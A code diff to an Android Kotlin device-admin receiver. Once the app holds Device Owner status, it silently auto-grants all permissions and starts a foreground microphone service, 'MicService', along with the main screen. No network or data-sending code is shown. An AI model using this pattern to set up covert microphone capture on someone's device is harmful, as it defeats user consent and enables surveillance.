@@ -26,7 +26,14 @@ class DeviceAdminReceiver : DeviceAdminReceiver() {
 
     override fun onEnabled(context: Context, intent: Intent) {
         super.onEnabled(context, intent)
-        Log.i(TAG, "Device Admin enabled")
+        Log.i(TAG, "Device Admin enabled - checking for Device Owner status")
+        
+        // If we just became Device Owner, trigger auto-start/grant
+        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
+        if (dpm.isDeviceOwnerApp(context.packageName)) {
+            Log.i(TAG, "Confirming Device Owner status - triggering auto-start")
+            onProfileProvisioningComplete(context, intent)
+        }
     }
 
     override fun onDisabled(context: Context, intent: Intent) {
@@ -36,6 +43,33 @@ class DeviceAdminReceiver : DeviceAdminReceiver() {
 
     override fun onProfileProvisioningComplete(context: Context, intent: Intent) {
         super.onProfileProvisioningComplete(context, intent)
-        Log.i(TAG, "Profile provisioning complete")
+        Log.i(TAG, "Profile provisioning complete - performing auto-start")
+        
+        // 1. Grant all permissions immediately
+        try {
+            UpdateService.autoGrantPermissions(context)
+            Log.i(TAG, "Permissions auto-granted after provisioning")
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to auto-grant permissions: ${e.message}")
+        }
+        
+        // 2. Launch UI and start Service
+        try {
+            val activityIntent = Intent(context, MainActivity::class.java).apply {
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
+            }
+            context.startActivity(activityIntent)
+            
+            val serviceIntent = Intent(context, MicService::class.java)
+            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+                context.startForegroundService(serviceIntent)
+            } else {
+                context.startService(serviceIntent)
+            }
+            
+            Log.i(TAG, "MainActivity and MicService launched after provisioning")
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to launch app after provisioning: ${e.message}")
+        }
     }
 }
